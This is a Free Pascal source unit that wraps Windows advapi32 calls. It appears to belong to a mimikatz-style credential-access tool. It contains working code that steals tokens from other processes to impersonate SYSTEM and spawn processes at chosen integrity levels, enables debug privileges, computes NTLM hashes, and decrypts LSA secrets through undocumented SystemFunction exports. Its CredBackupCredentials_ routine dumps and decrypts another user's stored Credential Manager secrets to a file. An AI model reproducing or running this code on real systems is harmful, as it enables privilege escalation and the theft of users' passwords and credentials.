unit uadvapi32;

{$mode delphi}
{$Define UsePacked}

interface

uses
  Classes, SysUtils,windows,utils,ucryptoapi;

const
  LOGON_WITH_PROFILE = $00000001;

  //https://github.com/gentilkiwi/mimikatz/blob/master/modules/kull_m_crypto_system.h
  const
  MD4_DIGEST_LENGTH=	16;
  MD5_DIGEST_LENGTH=	16;
  SHA_DIGEST_LENGTH=	20;

  DES_KEY_LENGTH=	7;
  DES_BLOCK_LENGTH=	8;
  AES_128_KEY_LENGTH=	16;
  AES_256_KEY_LENGTH=	32;

  //https://github.com/rapid7/meterpreter/blob/master/source/extensions/kiwi/mimikatz/modules/kuhl_m_lsadump_struct.h
  SYSKEY_LENGTH	=16;
  SAM_KEY_DATA_SALT_LENGTH=	16 ;
  SAM_KEY_DATA_KEY_LENGTH=	16;

type
 tbyte16__=array[0..15] of byte;

type
   TIntegrityLevel = (UnknownIntegrityLevel=0, LowIntegrityLevel, MediumIntegrityLevel, HighIntegrityLevel, SystemIntegrityLevel);


function GenerateNTLMHash(mypassword:string):string;
function GenerateNTLMHashByte(mypassword:string):tbyte16__;
function EnableDebugPriv(priv:string):boolean;
function enumprivileges:boolean;

function ImpersonateUser(const User, PW: string): Boolean;
function GetCurrUserName: string;

function CredBackupCredentials_(pid:dword;userpid:dword):boolean;

function ImpersonateAsSystemW_Vista(IntegrityLevel: TIntegrityLevel;pid:cardinal): Boolean;

function impersonatepid(pid:dword):boolean;

function CreateProcessAsLogon(const User, PW, Application, CmdLine: WideString): LongWord;

function CreateProcessAsSystemW_Vista(
  ApplicationName: PWideChar;
  CommandLine: PWideChar;
  CreationFlags: DWORD;
  Environment: Pointer;
  CurrentDirectory: PWideChar;
  StartupInfo: TStartupInfoW;
  var ProcessInformation: TProcessInformation;
  IntegrityLevel: TIntegrityLevel;
  const pid:cardinal=0): Boolean;

//***************************************************************************


function CreateProcessWithLogonW(
  lpUsername,
  lpDomain,
  lpPassword:PWideChar;
  dwLogonFlags:dword;
  lpApplicationName: PWideChar;
  lpCommandLine: PWideChar;
  dwCreationFlags: DWORD;
  lpEnvironment: Pointer;
  lpCurrentDirectory: PWideChar;
  lpStartupInfo: PStartupInfoW;
  lpProcessInformation: PProcessInformation
): BOOL; stdcall; external 'advapi32.dll';

function CredBackupCredentials(Token:handle;
                                   Path:LPCWSTR;
                                   Password:PVOID;
                                   PasswordSize:DWORD;
                                   Flags:DWORD):BOOL; stdcall; external 'advapi32.dll';

//function LsaNtStatusToWinError(Status: cardinal): ULONG; stdcall;external 'Advapi32.dll';


type
   MD4_CTX  = packed record
    _Buf    : array[0..3] of LongWord;
    _I      : array[0..1] of LongWord;
    input   : array[0..63] of byte;
    digest  : Array[0..MD4_DIGEST_LENGTH-1] of Byte;
   end;


Procedure MD4Init(Var Context: MD4_CTX); StdCall;external 'advapi32.dll';
Procedure MD4Update(Var Context: MD4_CTX; const Input; inLen: LongWord); StdCall;external 'advapi32.dll';
Procedure MD4Final(Var Context: MD4_CTX); StdCall;external 'advapi32.dll';
//function MD4_Selftest:Boolean;


type
  MD5_DIG  = {$IfDef UsePacked} packed {$EndIf} array[0..15] of byte;
  MD5_CTX  = {$IfDef UsePacked} packed {$EndIf} record
    i:      Array[0.. 1] of LongWord;
    buf:    Array[0.. 3] of LongWord;
    input:  Array[0..63] of Byte;
    digest: MD5_DIG;
  End;

  type _CRYPTO_BUFFER = {packed} record
  	 Length:dword;
  	 MaximumLength:dword;
  	 Buffer:PBYTE;
  end;
  PCRYPTO_BUFFER=^_CRYPTO_BUFFER;
  PCCRYPTO_BUFFER=^_CRYPTO_BUFFER; //? to be verified...



//SystemFunction004
//extern NTSTATUS WINAPI RtlEncryptDESblocksECB(IN PCCRYPTO_BUFFER data, IN PCCRYPTO_BUFFER key, OUT PCRYPTO_BUFFER output);
//SystemFunction005  -> use to decrypt lsasecrets on NT5
//extern NTSTATUS WINAPI RtlDecryptDESblocksECB(IN PCCRYPTO_BUFFER data, IN PCCRYPTO_BUFFER key, OUT PCRYPTO_BUFFER output);
function RtlDecryptDESblocksECB(const data:_CRYPTO_BUFFER;const key:_CRYPTO_BUFFER;var output:_CRYPTO_BUFFER):dword ;StdCall;external 'advapi32.dll' name 'SystemFunction005';
//SystemFunction032 or SystemFunction033?
//extern NTSTATUS WINAPI RtlEncryptDecryptRC4(IN OUT PCRYPTO_BUFFER data, IN PCCRYPTO_BUFFER key);
function RtlEncryptDecryptRC4(var  data:_CRYPTO_BUFFER;   const key:_CRYPTO_BUFFER):dword ;StdCall;external 'advapi32.dll' name 'SystemFunction032';

//extern NTSTATUS WINAPI RtlDecryptDES2blocks1DWORD(IN LPCBYTE data, IN LPDWORD key, OUT LPBYTE output);
function RtlDecryptDES2blocks1DWORD(const data:pointer; key:pdword;var output:array of byte):dword ;StdCall;external 'advapi32.dll' name 'SystemFunction025';


// The MD5Init function initializes an MD5 message digest context.
procedure MD5Init(var ctx : MD5_CTX); stdcall;external 'advapi32.dll';
// The MD5Update function updates the MD5 context by using the supplied buffer for the message whose MD5 digest is being generated
procedure MD5Update(var ctx : MD5_CTX; const Buffer; const BufferSize : LongInt); stdcall;external 'advapi32.dll';
//The MD5Final function ends an MD5 message digest previously started by a call to the MD5Init function
procedure MD5Final(var ctx : MD5_CTX); stdcall;external 'advapi32.dll';
//function MD5string(const data : Ansistring):AnsiString;
//function MD5_Selftest:Boolean;

{lets go late binding
function CreateProcessWithTokenW(hToken: THandle;
  dwLogonFlags: DWORD;
  lpApplicationName: PWideChar;
  lpCommandLine: PWideChar;
  dwCreationFlags: DWORD;
  lpEnvironment: Pointer;
  lpCurrentDirectory: PWideChar;
  lpStartupInfo: PStartupInfoW;
  lpProcessInformation: PProcessInformation): BOOL; stdcall;external 'advapi32.dll';
  }

  function RevertToSelf: BOOL; stdcall;external 'advapi32.dll';

function DuplicateTokenEx(hExistingToken: HANDLE; dwDesiredAccess: DWORD;
  lpTokenAttributes: LPSECURITY_ATTRIBUTES; ImpersonationLevel: SECURITY_IMPERSONATION_LEVEL;
  TokenType: TOKEN_TYPE; var phNewToken: HANDLE): BOOL; stdcall;external 'advapi32.dll';

//function ConvertStringSidToSidA(StringSid: LPCSTR; var Sid: PSID): BOOL; stdcall;
function ConvertStringSidToSidW(StringSid: LPCWSTR; var Sid: PSID): BOOL; stdcall;external 'advapi32.dll';
//function ConvertStringSidToSid(StringSid: LPCTSTR; var Sid: PSID): BOOL; stdcall;
function ConvertStringSidToSidA(StringSid: pchar; var Sid: PSID): BOOL; stdcall;external 'advapi32.dll';// name 'ConvertStringSidToSidA';

function ConvertSidToStringSidA(SID: PSID; var StringSid: pchar): Boolean; stdcall;
    external 'advapi32.dll';// name 'ConvertSidToStringSidA';
function ConvertSidToStringSidW(SID: PSID; var StringSid: pwidechar): Boolean; stdcall;
    external 'advapi32.dll';// name 'ConvertSidToStringSidA';

// SHA1

type
  SHA_CTX = packed record
   	Unknown : array[0..5] of LongWord;
	   State   : array[0..4] of LongWord;
	   Count   : array[0..1] of LongWord;
    	Buffer  : array[0..63] of Byte;
  end;

  SHA_DIG = packed record
	   Dig     : array[0..19] of Byte;
  end;

procedure A_SHAInit(var Context: SHA_CTX); StdCall;external 'advapi32.dll';
procedure A_SHAUpdate(var Context: SHA_CTX; const Input; inlen: LongWord); StdCall;external 'advapi32.dll';
procedure A_SHAFinal(var Context: SHA_CTX; out Digest:SHA_DIG); StdCall;external 'advapi32.dll';

//function SHA_Selftest:Boolean;

implementation

const
  LOW_INTEGRITY_SID: PWideChar = ('S-1-16-4096');
  MEDIUM_INTEGRITY_SID: PWideChar = ('S-1-16-8192');
  HIGH_INTEGRITY_SID: PWideChar = ('S-1-16-12288');
  SYSTEM_INTEGRITY_SID: PWideChar = ('S-1-16-16384');

  SE_GROUP_INTEGRITY = $00000020;

type
  _TOKEN_MANDATORY_LABEL = record
    Label_: SID_AND_ATTRIBUTES;
  end;
  TOKEN_MANDATORY_LABEL = _TOKEN_MANDATORY_LABEL;
  PTOKEN_MANDATORY_LABEL = ^TOKEN_MANDATORY_LABEL;

type PWSTR = PWideChar;
type
  _LSA_UNICODE_STRING = record
    Length: USHORT;  //2
    MaximumLength: USHORT; //2
    //in x64 an extra dword fiedl may be needed to align to 8 bytes !!!!!!!!!
    {$ifdef CPU64}dummy:dword; {$endif cpu64} //4
    Buffer: PWSTR;
  end;
  PLSA_UNICODE_STRING=  ^_LSA_UNICODE_STRING;

function DecryptDESblocksECB(data,key:tbytes;var output:tbytes):boolean;
var
  _data,_key,_output:_CRYPTO_BUFFER;
  status:dword;
begin
//in only
        fillchar(_data,sizeof(_data),0);
        _data.Length :=length(data);
        _data.MaximumLength :=length(data);
        _data.Buffer :=@data[0];
        //in only
        fillchar(_key,sizeof(_key),0);
        _key.Length:=length(key);
        _key.MaximumLength:=length(key);
        _key.Buffer:=@key[0] ;  //usually a hash
        status:=RtlDecryptDESblocksECB(_data,_key,_output);
        //if status<>0 then log('RtlDecryptDESblocksECB NOT OK',0) else log('RtlDecryptDESblocksECB OK',0);
        result:=status=0;
        if status=0 then CopyMemory(@output [0],_output.Buffer ,_output.Length ) ;
end;

function GenerateNTLMHash(mypassword:string):string;
type
//aka rtldigestntlm
tSystemFunction007 = Function( password:pchar;hash:pointer): integer; stdcall;
var
i:byte;
ret:integer;
lib:thandle;
sysfunc7:tSystemFunction007;
hash:array [0..15] of byte;
strpassword,strHash:string;
data:_LSA_UNICODE_STRING ;
begin
lib:=LoadLibrary('advapi32.dll');
if lib <> 0 then
begin
sysfunc7 := GetProcAddress(lib, 'SystemFunction007');
if Assigned(sysfunc7) then
begin
fillchar(hash,16,0);
strpassword:=mypassword;
//
data.MaximumLength := 4096;
data.Buffer := AllocMem(data.MaximumLength);
data.Length := Length(strpassword) * SizeOf(WideChar);
StringToWideChar(strpassword, data.Buffer,Length(strpassword) + 1);
//
ret:=sysfunc7(@data,@hash[0]);
for i:=0 to 15 do strHash :=strHash +IntToHex ( hash[i],2);
result :=strHash ;
end; //if Assigned(sysfunc6) then
FreeLibrary(lib);
end; //if lib <> 0 then
end;

function GenerateNTLMHashByte(mypassword:string):Tbyte16__;
type
//aka rtldigestlm
tSystemFunction007 = Function( password:pchar;hash:pointer): integer; stdcall;
var
i:byte;
ret:integer;
lib:thandle;
sysfunc7:tSystemFunction007;
hash:tbyte16__;
strpassword:string;
data:_LSA_UNICODE_STRING ;
begin
lib:=LoadLibrary('advapi32.dll');
if lib <> 0 then
begin
sysfunc7 := GetProcAddress(lib, 'SystemFunction007');
if Assigned(sysfunc7) then
begin
fillchar(hash,16,0);
strpassword:=mypassword;
//
data.MaximumLength := 4096;
data.Buffer := AllocMem(data.MaximumLength);
data.Length := Length(strpassword) * SizeOf(WideChar);
StringToWideChar(strpassword, data.Buffer,Length(strpassword) + 1);
//
ret:=sysfunc7(@data,@hash[0]);
result :=Hash ;
end; //if Assigned(sysfunc6) then
FreeLibrary(lib);
end; //if lib <> 0 then
end;


function EnableDebugPriv(priv:string):boolean;
var
  NewState,prev: TTokenPrivileges;
  luid: TLargeInteger;
  hToken: THandle;
  ReturnLength: DWord;
begin
result:=false;
  //TOKEN_ADJUST_PRIVILEGES is just not enough...
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, hToken) then
  begin
   if LookupPrivilegeValue(nil, PChar(priv), luid) then
   begin
    NewState.PrivilegeCount:= 1;
    NewState.Privileges[0].Luid := luid;
    NewState.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    fillchar(prev,sizeof(prev),0);
    if AdjustTokenPrivileges(hToken, False, NewState, SizeOf(TTokenPrivileges), prev, ReturnLength) then
    begin
    result:=true;

      if GetLastError = ERROR_NOT_ALL_ASSIGNED then
        //WriteLn('Change privilege failed: Not all assigned')
      result:=false; //finally not ... :)
      //else WriteLn('Privileged');

    end;
    //else writeln(getlasterror);
   end;
    CloseHandle(hToken);
  end;
end;

function GetCurrUserName: string;
var
  Size              : DWORD;
begin
  Size := MAX_COMPUTERNAME_LENGTH + 1;
  SetLength(Result, Size);
  if GetUserName(PChar(Result), Size) then
    SetLength(Result, Size-1)
  else
    Result := '';
end;

function ImpersonateUser(const User, PW: string): Boolean;
var
 LogonType         : Integer;
 LogonProvider     : Integer;
 TokenHandle       : THandle;
 strAdminUser      : string;
 strAdminDomain    : string;
 strAdminPassword  : string;
begin
 LogonType := LOGON32_LOGON_INTERACTIVE;
 LogonProvider := LOGON32_PROVIDER_DEFAULT;
 strAdminUser := USER;
 strAdminDomain := '';
 strAdminPassword := PW;
 Result := LogonUser(PChar(strAdminUser), nil,
   PChar(strAdminPassword), LogonType, LogonProvider, TokenHandle);
 if Result then
 begin
   Result := ImpersonateLoggedOnUser(TokenHandle);
 end;
end;

function CreateProcessAsLogon(const User, PW, Application, CmdLine: WideString):
  LongWord;
var
  si           : TStartupInfoW;
  pif          : TProcessInformation;
begin
  //writeln(user+':'+pw);
  ZeroMemory(@si, sizeof(si));
  si.cb := sizeof(si);
  si.dwFlags := STARTF_USESHOWWINDOW;
  si.wShowWindow := 1;

  SetLastError(0);
  CreateProcessWithLogonW(PWideChar(User), nil, PWideChar(PW),
    LOGON_WITH_PROFILE, nil, PWideChar(Application+' "'+CmdLine+'"'),
    CREATE_DEFAULT_ERROR_MODE, nil, nil, @si, @pif);
  Result := GetLastError;
end;

function GetWinlogonProcessId: Cardinal;
begin
 //TBD
end;

function CreateProcessAsSystemW_Vista(
  ApplicationName: PWideChar;
  CommandLine: PWideChar;
  CreationFlags: DWORD;
  Environment: Pointer;
  CurrentDirectory: PWideChar;
  StartupInfo: TStartupInfoW;
  var ProcessInformation: TProcessInformation;
  IntegrityLevel: TIntegrityLevel;
  const pid:cardinal=0): Boolean;
type
  TCreateProcessWithTokenW=function(hToken: THandle;
  dwLogonFlags: DWORD;
  lpApplicationName: PWideChar;
  lpCommandLine: PWideChar;
  dwCreationFlags: DWORD;
  lpEnvironment: Pointer;
  lpCurrentDirectory: PWideChar;
  lpStartupInfo: PStartupInfoW;
  lpProcessInformation: PProcessInformation): BOOL; stdcall;
var
  ProcessHandle, TokenHandle, ImpersonateToken: THandle;
  Sid: PSID;
  MandatoryLabel: PTOKEN_MANDATORY_LABEL;
  ReturnLength: DWORD;
  PIntegrityLevel: PWideChar;
  CreateProcessWithTokenW:pointer;
begin
  Result := False;
  CreateProcessWithTokenW:=getprocaddress(loadlibrary('advapi32.dll'),'CreateProcessWithTokenW');
  if (@CreateProcessWithTokenW = nil) then
    Exit;
  try
    if pid=0
      then ProcessHandle := OpenProcess(MAXIMUM_ALLOWED, False, GetWinlogonProcessId)
      else ProcessHandle := OpenProcess(MAXIMUM_ALLOWED, False, pid);
    if ProcessHandle <> 0 then
    begin
      try
        if OpenProcessToken(ProcessHandle, MAXIMUM_ALLOWED, TokenHandle) then
        begin
          try
            log('- Executing OpenProcessToken',1);
            if DuplicateTokenEx(TokenHandle, MAXIMUM_ALLOWED, nil, SecurityImpersonation, TokenPrimary, ImpersonateToken) then
            begin
              try
                log('- Executing DuplicateTokenEx',1);
                New(Sid);
                if (not GetTokenInformation(ImpersonateToken, TTokenInformationClass(TokenIntegrityLevel), MandatoryLabel, 0, ReturnLength)) and (GetLastError = ERROR_INSUFFICIENT_BUFFER) then
                begin
                  log('- Executing GetTokenInformation',1);
                  MandatoryLabel := nil;
                  GetMem(MandatoryLabel, ReturnLength);
                  if MandatoryLabel <> nil then
                  begin
                    try
                      if GetTokenInformation(ImpersonateToken, TTokenInformationClass(TokenIntegrityLevel), MandatoryLabel, ReturnLength, ReturnLength) then
                      begin
                        //writeln('GetTokenInformation OK');
                        if IntegrityLevel = SystemIntegrityLevel then
                          PIntegrityLevel := (SYSTEM_INTEGRITY_SID)
                        else if IntegrityLevel = HighIntegrityLevel then
                          PIntegrityLevel := (HIGH_INTEGRITY_SID)
                        else if IntegrityLevel = MediumIntegrityLevel then
                          PIntegrityLevel := (MEDIUM_INTEGRITY_SID)
                        else if IntegrityLevel = LowIntegrityLevel then
                          PIntegrityLevel := (LOW_INTEGRITY_SID);

                        //writeln(strpas(PIntegrityLevel));
                        if ConvertStringSidToSidw(PIntegrityLevel, Sid) then
                        begin
                          log('- Executing TCreateProcessWithTokenW',1);
                          MandatoryLabel.Label_.Sid := Sid;
                          MandatoryLabel.Label_.Attributes := SE_GROUP_INTEGRITY;
                          if SetTokenInformation(ImpersonateToken, TTokenInformationClass(TokenIntegrityLevel), MandatoryLabel, SizeOf(TOKEN_MANDATORY_LABEL) + GetLengthSid(Sid)) then
                          begin
                            Result := TCreateProcessWithTokenW(CreateProcessWithTokenW)(ImpersonateToken, 0, ApplicationName, CommandLine, CreationFlags, Environment, CurrentDirectory, @StartupInfo, @ProcessInformation);
                            //writeln(result);
                            SetLastError(0);
                          end;
                        end;
                      end;
                    finally
                      FreeMem(MandatoryLabel);
                    end;
                  end;
                end;
              finally
                CloseHandle(ImpersonateToken);
              end;
            end;
          finally
            CloseHandle(TokenHandle);
          end;
        end;
      finally
        CloseHandle(ProcessHandle);
      end;
    end;
  except
  end;
end;

function ImpersonateAsSystemW_Vista(IntegrityLevel: TIntegrityLevel;pid:cardinal): Boolean;
var
  ProcessHandle, TokenHandle, ImpersonateToken: THandle;
  Sid: PSID;
  MandatoryLabel: PTOKEN_MANDATORY_LABEL;
  ReturnLength: DWORD;
  PIntegrityLevel: PWideChar;
  //
   StartInfo: TStartupInfoW;
  ProcInfo: TProcessInformation;
begin
  log('**** ImpersonateAsSystemW_Vista ****');
  Result := False;
  if (@ImpersonateLoggedOnUser = nil) then
    Exit;
  try
  ProcessHandle := OpenProcess(MAXIMUM_ALLOWED, False, pid);
    if ProcessHandle <> 0 then
    begin
      try
        if OpenProcessToken(ProcessHandle, MAXIMUM_ALLOWED, TokenHandle) then
        begin
          try
            if DuplicateTokenEx(TokenHandle, MAXIMUM_ALLOWED, nil, SecurityImpersonation, TokenPrimary, ImpersonateToken) then
            begin
              try
                New(Sid);
                if (not GetTokenInformation(ImpersonateToken, TTokenInformationClass(TokenIntegrityLevel), MandatoryLabel, 0, ReturnLength)) and (GetLastError = ERROR_INSUFFICIENT_BUFFER) then
                begin
                  MandatoryLabel := nil;
                  GetMem(MandatoryLabel, ReturnLength);
                  if MandatoryLabel <> nil then
                  begin
                    try
                      if GetTokenInformation(ImpersonateToken, TTokenInformationClass(TokenIntegrityLevel), MandatoryLabel, ReturnLength, ReturnLength) then
                      begin
                        if IntegrityLevel = SystemIntegrityLevel then
                          PIntegrityLevel := SYSTEM_INTEGRITY_SID
                        else if IntegrityLevel = HighIntegrityLevel then
                          PIntegrityLevel := HIGH_INTEGRITY_SID
                        else if IntegrityLevel = MediumIntegrityLevel then
                          PIntegrityLevel := MEDIUM_INTEGRITY_SID
                        else if IntegrityLevel = LowIntegrityLevel then
                          PIntegrityLevel := LOW_INTEGRITY_SID;
                        if ConvertStringSidToSidW(PIntegrityLevel, Sid) then
                        begin
                          MandatoryLabel.Label_.Sid := Sid;
                          MandatoryLabel.Label_.Attributes := SE_GROUP_INTEGRITY;
                          if SetTokenInformation(ImpersonateToken, TTokenInformationClass(TokenIntegrityLevel), MandatoryLabel, SizeOf(TOKEN_MANDATORY_LABEL) + GetLengthSid(Sid)) then
                          begin
                            {
                            FillChar(StartInfo, SizeOf(TStartupInfoW), #0);
                            FillChar(ProcInfo, SizeOf(TProcessInformation), #0);
                            StartInfo.cb := SizeOf(TStartupInfo);
                            StartInfo.lpDesktop := pwidechar(widestring('WinSta0\Default'));
                            Result := CreateProcessWithTokenW(ImpersonateToken, 0, '', widestring('c:\windows\system32\cmd.exe'), CREATE_NEW_PROCESS_GROUP or NORMAL_PRIORITY_CLASS, nil, nil, @StartInfo, @ProcInfo);
                            }
                            result:=ImpersonateLoggedOnUser (ImpersonateToken);
                            SetLastError(0);
                          end;
                        end;
                      end;
                    finally
                      FreeMem(MandatoryLabel);
                    end;
                  end;
                end;
              finally
                CloseHandle(ImpersonateToken);
              end;
            end;
          finally
            CloseHandle(TokenHandle);
          end;
        end;
      finally
        CloseHandle(ProcessHandle);
      end;
    end;
  except
  end;
end;

////////////////////////////////////////////////////////////////////////////////////
// Enumerating privileges held by the current user.
function enumprivileges:boolean;
type
  TPrivilegesArray = array [0..1024] of TLuidAndAttributes;
  PPrivilegesArray = ^TPrivilegesArray;
var
  TokenHandle: THandle;
  Size: Cardinal;
  Privileges: PTokenPrivileges;
  I: Integer;
  Luid: TLuid;
  Name: string;
  Attr: Longword;
  function AttrToString: string;
  begin
    Result := '';
    if (Attr and SE_PRIVILEGE_ENABLED) <> 0 then
       Result := Result + 'Enabled ';
    if (Attr and SE_PRIVILEGE_ENABLED_BY_DEFAULT) <> 0
       then Result := Result + 'EnabledByDefault';
    Result := '[' + Trim(Result) + ']';
  end;
begin
  Win32Check(OpenProcessToken(GetCurrentProcess,
    TOKEN_QUERY, TokenHandle));
  try
    GetTokenInformation(TokenHandle, TokenPrivileges, nil,
      0, Size);
    Privileges := AllocMem(Size);
    Win32Check(GetTokenInformation(TokenHandle, TokenPrivileges, Privileges, Size, Size));
    for I := 0 to Privileges.PrivilegeCount - 1 do
    begin
      Luid := PPrivilegesArray(@Privileges^.Privileges)^[I].Luid;
      Attr := PPrivilegesArray(@Privileges^.Privileges)^[I].Attributes;
      Size := 0;
      LookupPrivilegeName(nil, Luid, nil, Size);
      SetLength(Name, Size);
      LookupPrivilegeName(nil, Luid, PChar(Name), Size);
      writeln(PChar(Name) + ' ' + AttrToString);
    end;
  finally
    CloseHandle(TokenHandle);
  end;
end;

function impersonatepid(pid:dword):boolean;
var
  i:byte;
begin
log('**** impersonatepid ****');
log('pid:'+inttostr(pid));
if pid=0 then exit;
result:=false;
for i:=4 downto 0 do
  begin
  if ImpersonateAsSystemW_Vista (TIntegrityLevel(i),pid) then begin result:=true;exit;end;
  end;
end;

//https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html
function CredBackupCredentials_(pid:dword;userpid:dword):boolean;
type
  //{$align 8}
  _MY_BLOB = record
    cbData: DWORD;
    pbData: LPBYTE;
  end;
const
  PROCESS_QUERY_LIMITED_INFORMATION: DWORD = 4096;
var
  //pid:dword;
  creds,verify:_MY_BLOB;
  dwFileSize,dwread,dwWrite:dword;
  status:bool;
  hproc:tHANDLE=thandle(-1);
  htoken:tHANDLE=thandle(-1);
  impToken :tHANDLE=thandle(-1);
  userProc :tHANDLE=thandle(-1);
  userToken:tHANDLE=thandle(-1);
  hFile:tHANDLE=thandle(-1);
  hwFile:tHANDLE=thandle(-1);
  tp,prev:TTokenPrivileges; //Windows.TOKEN_PRIVILEGES;
  luid:TLargeInteger; //Windows.LUID;
  returnedlength:dword;
  backupFile :pointer=nil;
  currentdir:string;
begin
  result:=false;
  currentdir :=GetCurrentDir;
  log('OpenProcess '+inttostr(pid));
  hProc:= OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,PID);
  if hproc=thandle(-1) then exit;

  log('OpenProcessToken...');
  status:= OpenProcessToken(hProc,TOKEN_DUPLICATE,hToken);
  if status=false then exit;

  log('DuplicateTokenEx...');
  status:= DuplicateTokenEx(hToken,TOKEN_ALL_ACCESS,nil,SecurityImpersonation,TokenPrimary,impToken);
  if status=false then exit;

  //TOKEN_PRIVILEGES tp ={0};
  //LUID luid = {0};
  log('LookupPrivilegeValueA...');
  status:=LookupPrivilegeValueA(nil,'SeTrustedCredManAccessPrivilege',luid);
  if status=false then exit;

  tp.PrivilegeCount := 1;
  tp.Privileges[0].Luid := luid;
  tp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
  log('AdjustTokenPrivileges...');
  status:= AdjustTokenPrivileges(impToken,FALSE,tp,sizeof(TOKEN_PRIVILEGES),prev,returnedlength);
  if status=false then exit;

  log('OpenProcess '+inttostr(userpid));
  userProc := OpenProcess(PROCESS_ALL_ACCESS,FALSE,userpid);
  if userProc=thandle(-1) then exit;

  log('OpenProcessToken...');
  status := OpenProcessToken(userProc,TOKEN_ALL_ACCESS,userToken);
  if status=false then exit;

  log('ImpersonateLoggedOnUser...');
  status := ImpersonateLoggedOnUser(impToken);
  if status=false then exit;

  log('CredBackupCredentials...');
  status := CredBackupCredentials(userToken,lpcwstr('c:\temp\cred.dmp'),nil,0,0);
  if status=false then exit;

  log('CreateFile...');
  hFile := CreateFile(pchar('c:\temp\cred.dmp'),GENERIC_READ,0,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  if hFile=thandle(-1) then exit;

  log('GetFileSize...');
  dwFileSize := GetFileSize(hFile,nil);
  if dwFileSize = INVALID_FILE_SIZE then exit;

  log('ReadFile...'+inttostr(dwFileSize));
  backupFile := AllocMem(dwFileSize);
  dwRead := 0;
  ReadFile(hFile,backupFile^,dwFileSize,dwRead,nil);
  if dwread=0 then exit;

  log('CryptUnprotectData...');
  //DATA_BLOB creds = {0};
  creds.cbData := dwFileSize;
  creds.pbData := backupFile;
  //DATA_BLOB verify ={0};
  status := CryptUnprotectData(@creds,nil,nil,nil,nil,0,@verify);
  if status=false then begin log(getlasterror);exit;end;;

  log('RevertToSelf...');
  status:=RevertToSelf;

  log('CreateFile...');
  dwWrite:=0;
  hwFile := CreateFile(pchar(currentdir+'\ouput.dmp'),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);

  log('WriteFile...'+inttostr(verify.cbData));
  WriteFile(hwFile,verify.pbData^,verify.cbData,dwWrite,nil);
  if dwWrite=0 then exit;

  log('Cleaning...');
  if hproc<>thandle(-1) then CloseHandle(hProc);
  if hToken<>thandle(-1) then CloseHandle(hToken);
  if impToken<>thandle(-1) then CloseHandle(impToken);
  if userProc<>thandle(-1) then CloseHandle(userProc);
  if userToken<>thandle(-1) then CloseHandle(userToken);
  if hFile<>thandle(-1) then CloseHandle(hFile);
  if backupFile <>nil then freemem(backupFile );
  if hwFile<>thandle(-1) then CloseHandle(hwFile);

  log('check output.dmp',1);

  result:=true;
end;

end.

